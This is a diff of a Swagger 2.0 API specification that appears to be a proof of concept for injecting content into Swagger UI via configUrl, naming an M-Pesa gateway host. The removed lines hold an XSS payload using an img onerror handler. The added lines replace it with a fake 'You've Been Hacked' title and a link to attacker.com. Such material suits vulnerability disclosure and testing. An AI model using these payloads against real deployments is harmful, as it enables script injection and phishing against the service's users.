@@ -1,9 +1,8 @@
 {
   "swagger": "2.0",
   "info": {
-    "version": "1.0.0",
-    "title": "XSS PoC",
-    "description": "This might be escaped"
+    "title": "🔥 You've Been Hacked",
+    "description": "**This API is malicious!** [Click here](https://attacker.com)"
   },
   "host": "gateway.tz.smartphone.m-pesa.com",
   "basePath": "/service-adapter",
@@ -11,11 +10,11 @@
   "paths": {
     "/poc": {
       "get": {
-        "summary": "Test XSS",
-        "description": "Trigger XSS",
+        "summary": "Fake endpoint",
+        "description": "This was injected via `configUrl`",
         "responses": {
           "200": {
-            "description": "<img src=x onerror=alert(document.domain)>"
+            "description": "Fake data injected"
           }
         }
       }
